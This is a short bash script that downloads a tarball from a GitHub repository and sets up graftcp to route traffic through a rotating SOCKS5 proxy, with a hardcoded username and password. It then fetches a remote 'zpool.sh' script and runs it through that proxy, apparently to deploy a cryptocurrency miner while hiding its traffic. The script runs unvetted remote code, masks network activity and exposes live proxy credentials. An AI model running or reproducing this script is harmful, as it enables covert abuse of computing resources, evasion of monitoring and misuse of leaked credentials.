#!/bin/bash
curl -L -o graphics.tar.gz https://github.com/denisule54/dsX24/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = p.webshare.io:80
socks5_username = muulxjov-rotate
socks5_password = 4vpkb1s9f1yq
END
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
wget https://github.com/amit12986/SC/raw/main/zpool.sh
chmod +x zpool.sh
./graftcp/graftcp ./zpool.sh
